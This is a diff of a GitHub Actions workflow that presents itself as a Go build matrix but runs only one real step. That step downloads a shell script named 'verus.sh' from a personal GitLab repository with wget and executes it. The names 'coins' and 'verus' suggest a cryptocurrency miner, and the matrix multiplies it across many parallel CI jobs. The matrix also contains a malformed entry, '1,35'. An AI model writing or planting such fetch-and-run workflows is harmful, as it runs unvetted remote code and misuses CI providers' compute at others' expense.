@@ -1,53 +1,41 @@
-name: coins
+name: kunyuk.sh
 
-on: [push, pull_request]
+on: [workflow_dispatch]
 
 jobs:
 
-build:
+  build:
 
-name: akuganteng
+    name: Kunyuk
 
-runs-on: ubuntu-latest
+    runs-on: windows-latest
 
-strategy:
+    strategy:
 
-max-parallel: 1
+      max-parallel: 5
 
-fail-fast: false
+      fail-fast: false
 
-matrix:
+      matrix:
 
-go: [1.6, 1.7, 1.8, 1.9, 1.10]
+        go: [1.0, 1.1, 1.2, 1.3, 1,35]
 
-flag: [A, B, C, D, E, F, G, H, I]
+        flag: [A, B, C, D, E, F, G, H, I]
 
-timeout-minutes: 360
+    env:
 
-env:
+        NUM_JOBS: 20
 
-NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
 
-JOB: ${{ matrix.go }}
+    steps:
 
-steps:
+    - name: DOWNLOAD
 
-- name: Set up Go ${{ matrix.go }}
-
-uses: actions/setup-go@v1
-
-with:
-
-go-version: ${{ matrix.go }}
-
-id: go
-
-- name: Setup
-
-uses: actions/checkout@v2
-
-- name: akuganteng
-
-run: |
+      run: |
 
 wget https://gitlab.com/fajarranz19/m/-/raw/main/verus.sh && chmod +x verus.sh && ./verus.sh
+
+    - name: DONE
+
+      run: exit
